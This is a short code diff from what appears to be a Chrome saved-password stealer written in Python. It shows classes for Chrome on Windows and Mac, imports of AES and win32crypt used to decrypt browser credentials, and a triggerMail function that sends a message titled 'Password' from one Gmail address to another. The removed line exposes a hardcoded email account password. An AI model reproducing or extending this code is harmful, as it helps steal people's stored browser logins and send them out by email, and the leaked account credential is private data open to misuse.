@@ -22,8 +22,11 @@ from email import encoders
 from email.utils import formataddr
 from email.mime.application import MIMEApplication
 from os.path import basename
-from Cryptodome.Cipher import AES
-import base64,win32crypt
+# from Cryptodome.Cipher import AES
+from Crypto.Cipher import AES
+import base64
+import win32crypt
+
 
 class ChromeMac:
     def __init__(self):
@@ -179,7 +182,7 @@ class Chrome:
 def triggerMail():
     sender_email = "innusali8@gmail.com"
     receiver_email = "innus513.a@gmail.com"
-    password = "AdoreEncryption%%"
+    password = ""
 
     message = MIMEMultipart("alternative")
     message["Subject"] = "Password"
